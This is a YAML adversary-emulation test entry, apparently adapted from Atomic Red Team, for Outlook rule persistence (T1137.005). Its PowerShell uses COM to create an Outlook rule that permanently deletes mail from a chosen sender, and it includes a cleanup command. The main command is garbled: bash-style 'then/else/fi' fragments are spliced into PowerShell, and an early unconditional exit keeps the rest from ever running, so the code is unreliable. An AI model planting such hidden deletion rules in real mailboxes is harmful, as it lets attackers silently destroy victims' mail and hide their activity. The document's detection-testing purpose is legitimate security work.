- id: bddfd8d4-7687-4971-b611-50a537ab3ab4
  name: Outlook Rule - Sender Address Trigger with DeletePermanently Action via COM
    Object
  description: 'Creates an Outlook rule via COM that permanently deletes emails received

    from a specific sender address. Adversaries use sender-based triggers to

    make rules appear more legitimate (e.g. disguised as a filter for a

    specific colleague). Tests a different rule condition path through the

    COM object model. Uses DeletePermanently as it does not require a resolved

    Exchange folder unlike MoveToFolder.

    NOTE: This test MUST be run from a non-elevated (standard user) PowerShell

    session. Outlook COM fails with 0x80080005 when invoked as Administrator.'
  tactic: persistence
  technique:
    attack_id: T1137.005
    name: 'Office Application Startup: Outlook Rules'
  platforms:
    windows:
      psh:
        command: '$clsid = (Get-ItemProperty "REGISTRY::HKEY_CLASSES_ROOT\Outlook.Application\CLSID"
          -ErrorAction SilentlyContinue).''(Default)''; if ($clsid) { exit 0 } else
          { exit 1 }; then : ; else Write-Host "[-] Classic Outlook is not installed
          or COM is not registered."; Write-Host "    Install Microsoft 365 Apps with
          Classic Outlook before running this test."; Write-Host "    Note: The new
          Outlook for Windows does NOT support COM automation."; exit 1; fi; $isAdmin
          = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator");
          if ($isAdmin) {; Write-Host "[-] This test must be run from a non-elevated
          PowerShell session."; Write-Host "    Outlook COM fails with 0x80080005
          when run as Administrator."; exit 1; }; $outlook   = New-Object -ComObject
          Outlook.Application; $namespace = $outlook.GetNamespace("MAPI"); $rules     =
          $namespace.DefaultStore.GetRules(); $rule      = $rules.Create("AtomicTest_T1137005_SenderTrigger",
          0); $cond = $rule.Conditions.From; $cond.Enabled = $true; $cond.Recipients.Add("atomictest@redteam.local");
          $cond.Recipients.ResolveAll() | Out-Null; $action         = $rule.Actions.DeletePermanently;
          $action.Enabled = $true; $rule.Enabled = $true; $rules.Save(); Write-Host
          "[+] Sender-based rule ''AtomicTest_T1137005_SenderTrigger'' created. Emails
          from ''atomictest@redteam.local'' will be permanently deleted."'
        cleanup: $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator");
          if ($isAdmin) {; Write-Host "[-] Cleanup must be run from a non-elevated
          PowerShell session. Skipping."; exit 1; }; $outlook   = New-Object -ComObject
          Outlook.Application; $namespace = $outlook.GetNamespace("MAPI"); $rules     =
          $namespace.DefaultStore.GetRules(); $removed   = $false; for ($i = $rules.Count;
          $i -ge 1; $i--) {; if ($rules.Item($i).Name -eq "#{rule_name}") {; $rules.Remove($rules.Item($i).Name);
          $removed = $true; }; }; if ($removed) {; $rules.Save(); Write-Host "[+]
          All instances of rule '#{rule_name}' removed."; } else {; Write-Host "[*]
          Rule '#{rule_name}' not found - already removed."; }
        elevation_required: false
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - atomic-red-team
  - persistence
  - t1137.005
  author: Atomic Red Team
  additional_info:
    input_arguments:
      rule_name:
        description: Name for the malicious Outlook rule
        type: string
        default: AtomicTest_T1137005_SenderTrigger
      trigger_sender:
        description: Sender email address that triggers the rule
        type: string
        default: atomictest@redteam.local
    dependencies:
    - description: Classic Outlook must be installed (required for COM automation)
      prereq_command: '$clsid = (Get-ItemProperty "REGISTRY::HKEY_CLASSES_ROOT\Outlook.Application\CLSID"
        -ErrorAction SilentlyContinue).''(Default)''

        if ($clsid) { exit 0 } else { exit 1 }

        '
      get_prereq_command: 'Write-Host "[-] Classic Outlook is not installed or COM
        is not registered."

        Write-Host "    Install Microsoft 365 Apps with Classic Outlook before running
        this test."

        Write-Host "    Note: The new Outlook for Windows does NOT support COM automation."

        exit 1

        '
